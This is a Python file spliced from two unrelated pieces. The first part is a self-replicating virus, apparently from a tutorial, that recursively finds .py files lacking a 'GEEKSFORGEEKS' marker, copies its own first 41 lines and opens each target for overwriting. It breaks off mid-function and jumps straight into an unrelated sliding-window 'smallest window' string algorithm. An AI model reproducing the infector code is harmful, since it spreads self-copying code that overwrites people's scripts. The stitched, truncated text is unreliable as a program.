#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
''' Python solution '''

def smallestWindow(s, p):
	n = len(s)
	if n < len(p):
		return -1
	mp = [0]*256
	
	# Starting index of ans
	start = 0
	
	# Answer
	# Length of ans
	ans = n + 1
	cnt = 0
	
	# creating map
	for i in p:
		mp[ord(i)] += 1
		if mp[ord(i)] == 1:
			cnt += 1
			
	# References of Window	
	j = 0
	i = 0
	
	# Traversing the window
	while(j < n):
	
	# Calculating
		mp[ord(s[j])] -= 1
		if mp[ord(s[j])] == 0:
			cnt -= 1
			
			# Condition matching
			while cnt == 0:
				if ans > j - i + 1:
				
				# calculating answer.
					ans = j - i + 1
					start = i
					
				# Sliding I
				# Calculation for removing I
				mp[ord(s[i])] += 1
				if mp[ord(s[i])] > 0:
					cnt += 1
				i += 1
		j += 1
	if ans > n:
		return "-1"
	return s[start:start+ans]

# Driver code
if __name__ == "__main__":
	s = "ADOBECODEBANC"
	p = "ABC"
	result = smallestWindow(s, p)
	print("-->Smallest window that contain all character :", result)
	
	# This code is contributed by cyclades.
# Time Complexity: O(|s|), where |s| is the length of string s
# Space Complexity: O(1)
